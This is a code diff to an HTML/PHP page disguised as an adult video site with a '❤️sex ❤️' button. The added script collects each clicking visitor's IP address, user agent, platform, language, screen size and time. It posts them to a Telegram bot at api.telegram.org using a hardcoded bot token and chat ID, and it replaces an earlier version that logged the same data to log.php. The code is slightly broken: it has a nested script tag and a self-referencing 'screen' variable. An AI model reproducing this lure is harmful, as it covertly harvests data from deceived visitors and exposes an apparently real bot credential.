@@ -15,26 +15,52 @@
     <h1>🔥 hot vidoes 🔥</h1>
     <video id="myVideo" controls autoplay muted>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
+        dss.
     </video>
     <br>
     <button class="btn" onclick="sendData()">❤️sex ❤️</button>
 
     <script>
-        function sendData() {
-            fetch('log.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: screen.width + 'x' + screen.height,
-                    time: new Date().toLocaleString()
-                })
-            });
-            alert('injoy 😈');
+     <script>
+function sendData() {
+    const token = '8997744532:AAH_E-pwJ7Y4UjJUCkuhqQ_BW6wXolE4UZI';
+    const chatId = '7686982956';
+    const ip = '<?php echo $_SERVER["REMOTE_ADDR"]; ?>';
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const screen = screen.width + 'x' + screen.height;
+    const time = new Date().toLocaleString();
+
+    const message = `🔴 **زيارة جديدة** 🔴
+🕒 الوقت: ${time}
+🌐 IP: ${ip}
+📱 الجهاز: ${platform}
+🌍 اللغة: ${language}
+🖥️ الشاشة: ${screen}
+🧾 المتصفح: ${ua}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('✅injoy😈');
+        } else {
+            alert('❌ حصل خطأ، حاول مرة أخرى');
+        }
+    })
+    .catch(error => {
+        alert('⚠️ مشكلة في الاتصال');
+    });
+
         }
     </script>
 </body>
